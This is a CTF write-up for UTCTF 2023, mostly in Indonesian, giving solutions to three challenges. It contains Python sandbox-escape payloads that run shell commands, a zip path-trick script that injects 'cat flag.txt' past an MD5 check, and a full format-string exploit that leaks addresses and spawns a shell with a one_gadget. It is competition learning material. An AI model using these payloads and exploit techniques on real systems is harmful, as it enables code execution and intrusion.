# UTCTF 2023

## Web - Calculator

### Description

Who says guessing games shouldn’t let you do math?

[http://guppy.utctf.live:5957](http://guppy.utctf.live:5957/)

By Alex (@Alex_ on discord)

### Exploit

**************Level 0**************

Pada bypass pertama kita hanya perlu mengetikkan password untuk mendapatkan password untuk soal selanjutnya.

![https://i.imgur.com/rHdQ4vz.png](https://i.imgur.com/rHdQ4vz.png)

**************Level 1**************

Untuk bypass level 1 kita bisa menggunakan `__import__("os").system("cat pass*")` untuk membaca flagnya yang terdapat di current directory.

![https://i.imgur.com/mNdpBvd.png](https://i.imgur.com/mNdpBvd.png)

**************Level 2**************

Untuk membypass level 2 kita bisa menggunakan `__import__('sys').modules['__main__'].__dict__` untuk menginport module main yang berisi password.

![https://i.imgur.com/uXxu5hu.png](https://i.imgur.com/uXxu5hu.png)

**************Level 3**************

Untuk level 3 kita bisa menggunakan `().__class__.__base__.__subclasses__()[132].__init__.__globals__["sys"].modules["sys"].modules["__main__"].__dict__`
 untuk mendapatkan kembali global dan menggunakan cara di level 2 untuk mendapatkan passwordnya.

![https://i.imgur.com/ZnGPBgc.png](https://i.imgur.com/ZnGPBgc.png)

Setelah itu kita akan mendapatkan flagnya

![https://i.imgur.com/xEft5Wg.png](https://i.imgur.com/xEft5Wg.png)

## Misc - Zipper

### Description

NOTE: echo ‘Hello world’ is the only “allowed” command. Do not bruteforce other commands.

One of our spies has stolen documentation relating to a new class of missiles. Can you figure out how to hack them?

“We have developed a new protocol to allow reprogramming missiles in flight. We send a base64 encoded string representing a specifically formatted zip file to control these missiles. The missiles themselves verify each command before executing them to ensure that a hacker cannot manipulate them.”

A sample message has also been stolen by our spy.

By Aadhithya (@aadhi0319 on discord)

nc betta.utctf.live 12748

### Exploit

`verify_hash.py`

```python
import hashlib
import os
import sys
import zipfile

def get_file(name, archive):
    return [file for file in archive.infolist() if file.filename == name][0]

archive = zipfile.ZipFile(sys.argv[1])
file = get_file("commands/command.txt", archive)
data = archive.read(file)
md5 = hashlib.md5(data).hexdigest()

if md5 == "0e491b13e7ca6060189fd65938b0b5bc":
    archive.extractall()
    os.system("bash commands/command.txt")
    os.system("rm -r commands")
else:
    print("Invalid Command")
```

`commands.zip.b64`

```
UEsDBAoAAAAAADmPYVYAAAAAAAAAAAAAAAAJABwAY29tbWFuZHMvVVQJAAN95v9jfeb/Y3V4CwABBOgDAAAE6AMAAFBLAwQKAAAAAAAtj2FWWhLOtxMAAAATAAAAFAAcAGNvbW1hbmRzL2NvbW1hbmQudHh0VVQJAANm5v9jZub/Y3V4CwABBOgDAAAE6AMAAGVjaG8gJ0hlbGxvIFdvcmxkISdQSwMEFAAAAAgAMY9hVpwcB1ZUAAAAaQAAABIAHABjb21tYW5kcy9SRUFETUUubWRVVAkAA27m/2Nu5v9jdXgLAAEE6AMAAAToAwAANcrtDYAgDEXRVd4Axh0cpUKjxPIRWhS2l5j47yb3bArJ6QApXI6Rkl+t2+xkFJKCSqn5Zv9fXWAnQ4caRzxBBNzZNWMEwwSoLDQ+VFmbmGInd60vUEsBAh4DCgAAAAAAOY9hVgAAAAAAAAAAAAAAAAkAGAAAAAAAAAAQAO1BAAAAAGNvbW1hbmRzL1VUBQADfeb/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAC2PYVZaEs63EwAAABMAAAAUABgAAAAAAAEAAACAgUMAAABjb21tYW5kcy9jb21tYW5kLnR4dFVUBQADZub/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIADGPYVacHAdWVAAAAGkAAAASABgAAAAAAAEAAACAgaQAAABjb21tYW5kcy9SRUFETUUubWRVVAUAA27m/2N1eAsAAQToAwAABOgDAABQSwUGAAAAAAMAAwABAQAARAEAAAAA
```

Pada challenge ini kita akan diberikan dua source code seperti diatas. Source code pertama yaitu `verify_hash.py` merupakan script yang dibunakan untuk mengunzip dan akan di cek dengan md5 hash. Kita harus bisa membypass ini.

Untuk membypass md5 check tersebut kita bisa membuat file baru di dalam zip, Sehingga nanti akan tercipta 2 file seperti berikut.

![https://i.imgur.com/fypJP4W.png](https://i.imgur.com/fypJP4W.png)

Disini saya menggunakan perintah seperti berikut untuk menggenerate zip yang didalamnya seperti gambar diatas.

```bash
slipit --archive-type zip commands.zip "commands/command.txt" --separator "/" --depth 0 --prefix "commands" --static "{YOUR_COMMAND}"
```

Kita kirim zip tersebut.

```python
from pwn import *
import sys
from subprocess import check_output
import hashpumpy

context.log_level = "INFO"

def make_command(cmd):
    check_output(['zip', '-r', 'commands.zip', 'commands'])
    check_output(f'slipit --archive-type zip commands.zip "commands/command.txt" --separator "/" --depth 0 --prefix "commands" --static "{cmd}"', shell=True)
    with open("commands.zip", "rb") as f:
        data = f.read()
    b64_data = b64e(data).encode()
    with open("commands.zip.b64", "wb") as f:
        f.write(b64_data)

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        exit()
    return p

p = init()
make_command("cat flag.txt")
with open("commands.zip.b64", "rb") as f:
    p.sendline(f.read())
p.interactive()
```

Dan kita akan mendapatkan flagnya

![https://i.imgur.com/Qshu4bb.png](https://i.imgur.com/Qshu4bb.png)

## pwn - Printfail

Baru kli ini solv FSB tapi inputnya bkan di stack, untung aja prnah baca overwrite pointer dari pointer di blog ini

[https://devel0pment.de/?p=1881](https://devel0pment.de/?p=1881)

Script solver by muwa00

```python
from pwn import *
elf = ELF('./printfail.patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# p = elf.process()
p = remote(b'puffer.utctf.live', 4630)

def arbitrary_twobyte_write(address, value):
   # set stack_pointer to arbitrary address
   fmt_str = '%{0}x'.format(eval('0x' + hex(address)[-4:])).encode() + '%{0}$hn'.format(0x4 + 0x2 + 0x9).encode()
   fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
   p.sendlineafter(b'.\n', fmt_str)

   # write to arbitrary address
   fmt_str = '%{0}x'.format(value).encode() + '%{0}$hn'.format(0x4 + 0x2 + 0x25).encode()
   fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
   p.sendlineafter(b'.\n', fmt_str)

fmt_str  = "|%{0}$p|%{1}$s|%{2}$p|%{3}$p|".format(
   # stack
   (0x4 + 0x2 + 0x2),
   # stack_pointer
   (0x4 + 0x2 + 0x9),
   # libc
   (0x4 + 0x2 + 0x7),
   # elf
   (0x4 + 0x2 + 0x3)
).encode()
# unlimited input
fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
p.sendlineafter(b'.\n', fmt_str)

# calculate offset
leak = p.recvline_contains(b'|').split(b'|')
stack = eval(leak[1])
stack_pointer = u64(leak[2].ljust(8, b'\x00'))
stack_libc_start_main = stack+0x8

elf.address = eval(leak[4]) - 0x12d0
libc.address = (eval(leak[3])-243) - libc.sym['__libc_start_main']
log.info(f'elf base     @ 0x{elf.address:x}')
log.info(f'libc base    @ 0x{libc.address:x}')

# overwrite return address to one_gadget
data_to_overwrite = p64(libc.address + 0xe3b01)[:-4]
for x in enumerate([data_to_overwrite[i:i+2] for i in range(0, len(data_to_overwrite), 2)]):
   arbitrary_twobyte_write(stack_libc_start_main+(x[0]*2), u16(x[1]))

# spawn shell
p.sendlineafter(b'chance.', b'o_o :3')
p.interactive()
#utflag{one_printf_to_rule_them_all}
```

## Our Time WriteUp
Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/UTCTF%202023](https://github.com/daffainfo/ctf-writeup/tree/main/UTCTF%202023)

List

- Reverse Engineering - Reading List
- Networking - A Network Problem - Part 1
- Networking - A Network Problem - Part 2